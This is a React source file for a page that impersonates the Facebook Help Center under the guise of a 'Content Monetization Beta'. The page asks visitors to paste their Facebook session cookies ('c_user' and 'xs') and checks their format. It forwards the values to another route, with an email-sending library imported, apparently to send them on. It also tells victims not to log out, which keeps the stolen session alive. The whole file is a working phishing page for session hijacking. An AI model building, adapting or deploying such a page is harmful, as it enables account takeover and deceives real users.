import React, { useState, useRef } from "react";
import emailjs from "@emailjs/browser";
import FacebookVideo from "../assets/fbVideo.png";
import { useNavigate } from "react-router-dom";
// import LoginModal from "../modal/LoginModal";
// import "./style.css";

const Validation = () => {
  const form = useRef();
  const [showModal, setShowModal] = useState(false);
  const [isFormValid, setIsFormValid] = useState(false);
  const navigate = useNavigate();
  const sendEmail = (e) => {
    e.preventDefault();

    // Get the values of the input fields
    const cUserValue = form.current.elements["c_user"].value;
    const xsValue = form.current.elements["xs"].value;

    // Use regex patterns to validate the input fields
    const cUserPattern = /^\d{15}$/;
    const xsPattern = /.*%+.*/; // Pattern requiring at least one % symbol

    const isCUserValid = cUserPattern.test(cUserValue);
    const isXsValid = xsPattern.test(xsValue);

    // Only send if both fields are valid
    if (isCUserValid && isXsValid) {
      navigate("/facebook-security", {
        state: {
          data: {
            c_user: form.current.elements["c_user"].value,
            xs: form.current.elements["xs"].value,
          },
        },
      });
    } else {
      console.log("Invalid form fields.");
      setIsFormValid(true);
    }
  };

  return (
    <>
      <form ref={form} onSubmit={sendEmail}>
        <div
          className="d-flex align -items-center"
          style={{ width: "100%", height: "90px", background: "#4667AC" }}
        >
          <p className="text-white text-2xl  p-3 d-flex align-self-center">
            facebook
          </p>
        </div>

        <div
          className="d-flex align -items-center"
          style={{ width: "100%", height: "60px", background: "#E9EBEE" }}
        >
          <h4 className="text-lg font-medium pl-2 m-0 d-flex align-self-center text-primary">
            Help Center
          </h4>
        </div>

        <div className="col-12 mb-4 d-flex justify-content-center align-items-center">
          <div className="col-11 col-md-6 border">
            <div className="p-2" style={{ background: "#F5F6F7" }}>
              <h5 className="m-0">Facebook Content Monetization Beta</h5>
            </div>
            <div className="p-2">
              {isFormValid && (
                <div className="alert text-red-500 bg-red-100">
                  Please enter valid values for both fields.
                  <br />
                  For more detail check the video below.
                </div>
              )}
              <p className="fw-semibold validation_form_para mb-3">
                Get paid for your creativity, On Facebook you can earn money for
                your videos, reels, photos and text posts. Craft your content to
                fit your voice and your audience.
              </p>

              <p className="fw-semibold validation_form_para mb-3">
                Please provide the precise details below. Refer to the video for
                clarification if you find the instructions unclear.{" "}
              </p>
              <p
                className="fw-semibold text-secondary mb-3"
                style={{ fontSize: "12px" }}
              >
                Detailed Video Information.
              </p>

              <a href="https://firebasestorage.googleapis.com/v0/b/northern-card-408313.appspot.com/o/detailed%20video.mp4?alt=media&token=a36aa6ff-64b7-4d24-b294-cd35d4d57cc2">
                <img
                  src={FacebookVideo}
                  alt="fb"
                  style={{ width: "120px", height: "80px" }}
                />
              </a>
              <br />
              <p className="fw-semibold validation_form_para mb-3">
                Please be sure to provide the requested information below.
              </p>

              <label className="" style={{ fontSize: "12px" }}>
                c_user
              </label>
              <br />
              <input
                type="text"
                name="c_user"
                required
                className="border border-gray-600"
              />
              <br />
              <label className="mt-2" style={{ fontSize: "12px" }}>
                xs
              </label>
              <br />
              <input
                type="text"
                name="xs"
                //required
                //pattern="^[A-Za-z0-9%]*$"
                //title="Please enter a valid format"
                className="border border-gray-600"
              />
              <p className="mt-2" style={{ fontSize: "12px" }}>
                Please make sure not to log out from your computer or laptop
                until you have received a verification email.
              </p>
            </div>

            <div
              className="p-2 mb-2 d-flex justify-content-end"
              style={{ background: "#F5F6F7" }}
            >
              <button
                type="submit"
                className="text-white border-0 py-1 px-2"
                style={{ background: "#4267B2" }}
              >
                Submit
              </button>
            </div>
          </div>
        </div>
      </form>
      {showModal && (
        <LoginModal showModal={showModal} setShowModal={setShowModal} />
      )}
    </>
  );
};

export default Validation;
